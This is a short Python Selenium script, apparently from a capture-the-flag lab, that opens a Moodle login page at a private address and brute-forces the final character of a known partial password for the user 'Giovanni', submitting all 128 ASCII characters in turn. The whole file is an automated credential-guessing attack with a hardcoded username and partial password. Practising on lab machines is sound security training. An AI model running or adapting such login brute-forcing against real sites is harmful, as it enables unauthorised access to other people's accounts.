from selenium import webdriver

driver = webdriver.Firefox()
driver.get("http://10.10.10.153/moodle/login/index.php")

usernameXPath = "//*[@id=\"username\"]"
passwordXPath = "//*[@id=\"password\"]"
loginBoxXPath = "//*[@id=\"loginbtn\"]"

username = "Giovanni"
password = "Th4C00lTheacha"


for x in range(0, 128):
    usernameBox = driver.find_element_by_xpath(usernameXPath)
    passwordBox = driver.find_element_by_xpath(passwordXPath)
    loginButton = driver.find_element_by_xpath(loginBoxXPath)

    usernameBox.send_keys(username)
    passwordBox.send_keys(password + chr(x))
    loginButton.click()